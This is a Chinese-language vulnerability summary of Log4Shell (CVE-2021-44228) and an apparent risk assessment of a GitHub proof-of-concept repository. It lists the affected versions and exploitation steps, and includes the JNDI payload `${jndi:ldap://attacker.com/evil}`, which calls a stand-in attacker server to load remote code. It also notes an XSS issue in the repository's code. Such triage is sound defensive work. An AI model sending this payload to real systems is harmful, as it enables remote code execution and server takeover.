## CVE-2021-44228 - Apache Log4j2 Log4Shell RCE

**漏洞编号:** CVE-2021-44228

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** Apache Log4j2

**危害等级:** 极高危，可导致完全服务器接管

**影响版本:** 2.0-beta9 到 2.15.0（不包括安全版本 2.12.2、2.12.3 和 2.3.1）

**利用条件:** 目标应用使用了受影响版本的Log4j2，并且允许通过用户可控的输入来记录日志。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2021-44228，也称为Log4Shell，是Apache Log4j2中的一个严重漏洞。攻击者可以通过向服务器发送特制的字符串，该字符串包含JNDI查找，从而利用此漏洞。当Log4j2尝试记录此字符串时，它会执行JNDI查找，导致服务器从攻击者控制的LDAP服务器下载并执行恶意代码。 

**漏洞利用方式：**

1.  攻击者向目标系统发送包含恶意JNDI查找的请求。例如： `${jndi:ldap://attacker.com/evil}` 
2.  如果目标系统使用受影响的Log4j2版本记录此请求，Log4j2将尝试执行JNDI查找。 
3.  Log4j2连接到攻击者控制的LDAP服务器(`attacker.com`)。 
4.  LDAP服务器返回一个包含恶意Java类的URL。 
5.  Log4j2从该URL下载并执行恶意Java类，导致远程代码执行。 

**POC有效性：**

从提供的`pom.xml`文件可以看出，POC代码使用了`log4j-core`和`log4j-api`的2.14.1版本，该版本受到CVE-2021-44228漏洞的影响。因此，如果部署包含此Log4j2版本的Web应用，则攻击者可以通过发送恶意payload触发漏洞。`forgotpass.java`文件展示了如何从request中获取参数，并将其拼接到输出中，这可能是触发漏洞的点，攻击者可以在username参数中插入恶意payload.

**投毒风险：**

分析提供的代码，`forgotpass.java`看似存在XSS漏洞，该文件只是简单地将用户输入（username）插入到HTML的JavaScript代码中，使其能弹出一个prompt窗口，之后跳转到主页。没有发现明显的用于进行恶意利用的代码，如反弹shell或进行其他类型的远程控制操作。 `log4j.java` 是一个Logger类，没有实际逻辑。 总体而言，仓库中存在隐藏的投毒代码的可能性较低，估计在10%左右。主要考虑到作者可能在LDAP服务器上部署恶意java文件，从而进行投毒。需要更深入的分析才能确定是否存在更隐蔽的投毒行为。

**项目地址:** [Fauzan-Aldi/Log4j-_Vulnerability](https://github.com/Fauzan-Aldi/Log4j-_Vulnerability)

**漏洞详情:** [CVE-2021-44228](https://nvd.nist.gov/vuln/detail/CVE-2021-44228)